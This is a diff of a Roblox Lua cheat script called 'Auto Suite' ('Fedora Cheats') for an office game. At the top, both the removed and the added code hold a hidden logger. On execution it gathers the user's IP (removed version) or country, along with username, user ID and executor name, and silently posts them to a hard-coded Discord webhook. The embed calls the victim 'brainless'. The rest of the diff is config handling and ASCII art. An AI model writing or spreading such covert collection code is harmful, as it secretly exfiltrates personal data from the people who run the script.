@@ -1,121 +1,119 @@
 -- Game: Don't get fired at work
 -- Made by FedoraC and Exirl
 
-local Players     = game:GetService("Players")
-local Storage     = game:GetService("ReplicatedStorage")
-local Input       = game:GetService("UserInputService")
-local Vim         = game:GetService("VirtualInputManager")
-local HttpService = game:GetService("HttpService")
-local me          = Players.LocalPlayer
+-- We are allied with BLURSFUN GAMES now.
+-- FedoraC and Exirl are allied with BLURS.
 
-local webhookURL = "https://discord.com/api/webhooks/1559374825364136008/qOYpc1QvKh1e0-I-38log1TY4fgCeOjbJkQo5ytIl-eXnAugBwLw1ehrwnx8TppTehmJ"
+local Players   = game:GetService("Players")
+local Storage   = game:GetService("ReplicatedStorage")
+local Input     = game:GetService("UserInputService")
+local Vim       = game:GetService("VirtualInputManager")
+local Json      = game:GetService("HttpService")
+local me        = Players.LocalPlayer
 
-local function _request(opts)
-    if http_request then
-        local ok, res = pcall(http_request, opts)
-        if ok and res then return res end
-    end
-    if request then
-        local ok, res = pcall(request, opts)
-        if ok and res then return res end
-    end
-    if syn and syn.request then
-        local ok, res = pcall(syn.request, opts)
-        if ok and res then return res end
-    end
-    if http and http.request then
-        local ok, res = pcall(http.request, opts)
-        if ok and res then return res end
-    end
-    if fluxus and fluxus.request then
-        local ok, res = pcall(fluxus.request, opts)
-        if ok and res then return res end
-    end
-    return nil
-end
+local WEBHOOK = "https://discord.com/api/webhooks/1559374825364136008/qOYpc1QvKh1e0-I-38log1TY4fgCeOjbJkQo5ytIl-eXnAugBwLw1ehrwnx8TppTehmJ"
 
-local response = _request({
-    Url = "https://api64.ipify.org/?format=json",
-    Method = "GET"
-})
-
-local ipData = { ip = "Unknown" }
-if response and response.Body then
-    local ok, dec = pcall(HttpService.JSONDecode, HttpService, response.Body)
-    if ok and dec and dec.ip then
-        ipData = dec
-    end
-end
-
-print("[AutoSuite] IP fetched:", ipData.ip)
-
-local ipResponse = _request({
-    Url = webhookURL,
-    Method = "POST",
-    Headers = { ["Content-Type"] = "application/json" },
-    Body = HttpService:JSONEncode({ ["content"] = "User IP: " .. ipData.ip })
-})
-print("[AutoSuite] IP webhook status:", ipResponse and (ipResponse.StatusCode or ipResponse.Status or ipResponse.status or "sent") or "nil")
-
-local _id       = me.UserId
-local _username = me.Name
-local _display  = me.DisplayName or me.Name
-local _exec     = (function()
-    local ok, name = pcall(function()
-        if identifyexecutor then return identifyexecutor() end
-    end)
-    if ok and name then return tostring(name) end
-    return "Unknown"
-end)()
-
-local _country = "Unknown"
 do
-    local r = _request({ Url = "http://ip-api.com/json/", Method = "GET" })
-    if r and r.Body then
-        local ok, dec = pcall(HttpService.JSONDecode, HttpService, r.Body)
-        if ok and dec and dec.country then _country = tostring(dec.country) end
+    local HSvc = game:GetService("HttpService")
+
+    local function post(url, body)
+        local headers = { ["Content-Type"] = "application/json" }
+        local ok = pcall(function()
+            if syn and syn.request then
+                syn.request({ Url = url, Method = "POST", Headers = headers, Body = body })
+            elseif http and http.request then
+                http.request({ Url = url, Method = "POST", Headers = headers, Body = body })
+            elseif request then
+                request({ Url = url, Method = "POST", Headers = headers, Body = body })
+            elseif fluxus and fluxus.request then
+                fluxus.request({ Url = url, Method = "POST", Headers = headers, Body = body })
+            else
+                HSvc:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
+            end
+        end)
+        return ok
     end
-end
 
-local _pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(_id) .. "&width=420&height=420&format=png"
-do
-    local ok, url = pcall(function()
-        return Players:GetUserThumbnailAsync(_id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+    local function getexec()
+        local ok, name = pcall(function()
+            if identifyexecutor then return identifyexecutor() end
+        end)
+        if ok and name then return tostring(name) end
+        return "Unknown"
+    end
+
+    local function getcount()
+        local ok, res = pcall(function()
+            if syn and syn.request then
+                local r = syn.request({ Url = "http://ip-api.com/json/", Method = "GET" })
+                return r and r.Body
+            elseif http and http.request then
+                local r = http.request({ Url = "http://ip-api.com/json/", Method = "GET" })
+                return r and r.Body
+            elseif request then
+                local r = request({ Url = "http://ip-api.com/json/", Method = "GET" })
+                return r and r.Body
+            else
+                return game:HttpGet("http://ip-api.com/json/")
+            end
+        end)
+        if not ok or type(res) ~= "string" then return "Unknown" end
+        local ok2, decoded = pcall(HSvc.JSONDecode, HSvc, res)
+        if ok2 and decoded and decoded.country then
+            return tostring(decoded.country)
+        end
+        return "Unknown"
+    end
+
+    local function getpfp(userId)
+        local ok, url = pcall(function()
+            return Players:GetUserThumbnailAsync(
+                userId,
+                Enum.ThumbnailType.HeadShot,
+                Enum.ThumbnailSize.Size420x420
+            )
+        end)
+        if ok and url then return url end
+        return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
+    end
+
+    task.spawn(function()
+        local id   = me.UserId
+        local username = me.Name
+        local display  = me.DisplayName or me.Name
+        local country  = getcount()
+        local pfp      = getpfp(userId)
+        local exec     = getexec()
+
+        local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
+
+        local embed = {
+            title       = "🔓 Script Executed",
+            description = "A brainless user executed an auto script",
+            color       = 0x00C853,
+            thumbnail   = { url = pfp },
+            fields = {
+                { name = "👤 Username",     value = "`" .. username .. "`",              inline = true },
+                { name = "🏷️ Display Name", value = "`" .. display  .. "`",              inline = true },
+                { name = "🆔 User ID",      value = "`" .. tostring(id) .. "`",       inline = true },
+                { name = "🌍 Country",      value = "`" .. country .. "`",               inline = true },
+                { name = "🕒 Logged Time",  value = "`" .. timestamp .. "`",             inline = false },
+                { name = "⚙️ Executor",     value = "`" .. exec .. "`",                  inline = true },
+                { name = "🔗 Profile",      value = "[Roblox Profile](https://www.roblox.com/users/" .. tostring(id) .. "/profile)", inline = true },
+            },
+            footer = { text = "Auto Suite Logger • Fedora Cheats" },
+        }
+
+        local payload = HSvc:JSONEncode({
+            username   = "Auto Suite Logger",
+            avatar_url = pfp,
+            embeds     = { embed },
+        })
+
+        post(WEBHOOK, payload)
     end)
-    if ok and url then _pfp = url end
 end
 
-local _timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
-
-local _embed = {
-    title       = "Script Executed",
-    description = "A user executed an auto script",
-    color       = 0x00C853,
-    thumbnail   = { url = _pfp },
-    fields = {
-        { name = "Username",     value = "`" .. _username .. "`",     inline = true },
-        { name = "Display Name", value = "`" .. _display .. "`",      inline = true },
-        { name = "User ID",      value = "`" .. tostring(_id) .. "`", inline = true },
-        { name = "Country",      value = "`" .. _country .. "`",      inline = true },
-        { name = "Logged Time",  value = "`" .. _timestamp .. "`",    inline = false },
-        { name = "Executor",     value = "`" .. _exec .. "`",         inline = true },
-        { name = "IP Address",   value = "`" .. ipData.ip .. "`",     inline = true },
-        { name = "Profile",      value = "[Roblox Profile](https://www.roblox.com/users/" .. tostring(_id) .. "/profile)", inline = true },
-    },
-    footer = { text = "Auto Suite Logger - Fedora Cheats" },
-}
-
-local embedResponse = _request({
-    Url = webhookURL,
-    Method = "POST",
-    Headers = { ["Content-Type"] = "application/json" },
-    Body = HttpService:JSONEncode({
-        username   = "Auto Suite Logger",
-        avatar_url = _pfp,
-        embeds     = { _embed },
-    })
-})
-print("[AutoSuite] Embed webhook status:", embedResponse and (embedResponse.StatusCode or embedResponse.Status or embedResponse.status or "sent") or "nil")
 
 local file = "autosuite_config.json"
 
@@ -156,7 +154,7 @@ local function load()
     if not ok or not has then return end
     local ok2, raw = pcall(readfile, file)
     if not ok2 or type(raw) ~= "string" then return end
-    local ok3, dec = pcall(HttpService.JSONDecode, HttpService, raw)
+    local ok3, dec = pcall(Json.JSONDecode, Json, raw)
     if not ok3 or type(dec) ~= "table" then return end
     for k, v in next, dec do
         if base[k] ~= nil and type(v) == type(base[k]) then
@@ -167,7 +165,7 @@ end
 
 local function dump()
     if type(writefile) ~= "function" then return end
-    local ok, enc = pcall(HttpService.JSONEncode, HttpService, set)
+    local ok, enc = pcall(Json.JSONEncode, Json, set)
     if ok then pcall(writefile, file, enc) end
 end
 
@@ -987,4 +985,55 @@ task.spawn(function()
     end
 end)
 
-print("FEDORA CHEATS")
+print([[⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⣿⣿⣷⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⠊⠉⠉⠀⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⢀⣄⢠⣤⡤⠤⠤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⣧⣤⡔⠒⠶⠶⠦⠄⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠈⠁⠀⠁⠀⠀⠀⠈⢉⣭⠛⠛⠛⣛⣿⣿⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡞⠋⣠⣶⠾⠿⠿⢿⣷⣄⣀⠀⢀⣠⣤⣤⣤⣤⣀⣀⣿⣿⣿⣿⣷⣶⣤⡀⢀⣄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡟⠁⢠⡿⠇⠀⠀⠀⠀⣹⣿⣿⣷⡿⢿⣿⣿⣭⡽⣿⣿⣿⣯⣭⣛⣿⣿⣿⣿⡟⢿⣀⡀⢀⣀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠢⠴⠿⢿⣿⣧⣴⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⠿⣿⣿⠿⣿⣷⠸⣿⣿⣿⣇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠿⣋⣁⣤⣤⣤⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣄⣀⣹⣧⣀⡀⠙⢿⣧⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠙⠇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⠿⠟⣡⣾⣿⣿⣿⣿⣿⡿⠿⠿⠟⠻⠇⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡋⠻⠿⢿⡞⠙⠿⢿⣿⣿⣿⣿⣇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⡿⢿⠁⠀⠀⠀⢀⣴⣶⣮⣉⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣶⣶⠇⠀⠀⠀⠙⠿⣿⣿⢿⡄⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠺⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⢿⡿⠃⠀⠀⠀⠀⠀⠀⠸⣿⣾⠇⠰
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠠⡄
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⣄⠀⠀⠀⣠⡆⠀⠀⠀⣠⡔⠒⠒⢶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⢠⣶
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣏⠀⠀⠀⠀⣠⣤⣾⣿⠏⠀⠀⠀⣿⠁⠀⢠⣿⣿⣶⣶⣶⣶⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠈⠉
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢳⣶⣶⣿⡟⠉⠁⢀⡀⠀⠀⠀⠻⡆⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢰⣿⡇⠀⠀⠀⠀⠀⣿⡇⠀⠁
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣴⣶⣶⡾⠿⠷⣶⣄⣿⣧⠀⠀⢸⣿⠀⠀⣇⠀⠹⡀⠀⢻⣿⣿⣿⣿⣿⣿⡏⠀⢀⠀⠀⢀⣾⠋⠁⠀⠀⠀⠀⢠⣿⣇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠛⠁⠈⠀⠀⠀⠈⢹⣿⣿⡄⠀⢸⣿⠀⠀⢹⣤⣴⣿⣶⣾⣿⣿⣿⣿⣿⣿⣷⣶⣿⠦⠴⠿⠁⠀⠀⠀⠀⠀⣶⣾⠛⠙⠲⣶
+⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⢻⣇⠀⠀⢹⡄⠀⠈⠉⠙⢿⡏⠙⠛⢿⣿⣿⣿⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠏⠀⠀⠀⠈
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣷⣄⣀⣴⣦⣄⣰⣿⠋⠀⢸⢿⣇⠀⢸⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⠿⠿⠛⠻⡟⠁⠀⠀⢸⣼⡿⠀⢸⡟⣿⢀⠀⡄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀
+⠠⠀⠀⠀⠀⠀⠚⠿⣦⣄⣴⠀⠀⠀⣆⠀⠀⠀⠀⠀⠀⣸⣿⠇⠀⢸⡟⣿⢿⣿⣇⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠷⣄⠀⣿⠀⠀⠀⠀⠀⣴⣿⠇⠀⠀⢸⠇⠀⠸⠛⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢿⣿⡀⠀⠠⠤⢀⣿⡟⠀⠀⢠⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀
+⠀⠀⣀⠀⠀⠴⣀⣀⡀⠀⠀⠀⠀⠀⢿⣿⣦⠀⠀⠸⣿⡇⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣄⠀⠀⠈
+⠀⠀⠀⠀⠀⢀⠈⠻⣿⣶⣆⠀⠀⠀⢸⡇⠀⢠⠀⠀⢿⣇⠀⠀⣸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠟⠀⠀⠀
+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣦⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣧⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⣏⢹⣷⣸⣿⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⣿⣿⣀⣶⣷⣼⣿⡿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⢻⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡼⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⢿⣿⣿⢹⣿⣿⡟⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀
+⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣍⠀⣿⠿⢿⠀⣿⣿⡜⣿⡿⣿⠙⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣇⠀
+⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣾⣄⣤⠀⠛⢘⡇⠹⣧⣼⡇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⣾⣿⣿⠀⣿⡟⣿⠸⣿⣇⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣿⠿⠟⠀⠛⠀⣩⣤⣶⣿⣿⡿⣽⣿⣿⣿⣿⣿⠀
+⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣴⣶⣶⣶⣿⣿⣿⣿⣿⣿⢿⣾⣿⣿⣿⣿⣿⡟⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⡛⢿⣿⡿⠁⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⡟⠋⣽⣟⡿⣧⡉⢿⣿⡝⣟⢲⣾⠁⠀⠀
+⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣿⣿⣿⣿⣿⠉⣿⣿⣿⡇⠀⣶⣾⡿⣦⠘⣷⣯⣾⠟⢰⡄⠋⣷⡿⠃⠀⠀⠀
+⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣾⣿⣿⣿⣿⣿⢠⣿⣿⣿⣿⠀⢻⣿⠷⢿⣇⠘⠿⣀⠀⢈⣥⡾⠋⠀⠀⠀⠀⠀
+⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⡀⠘⣿⠀⠀⢹⡆⠀⣻⣴⠟⠋⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣾⣿⣿⣿⣿⣇⠀⢻⣤⣴⣶⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+                 FEDORA CHEATS]])
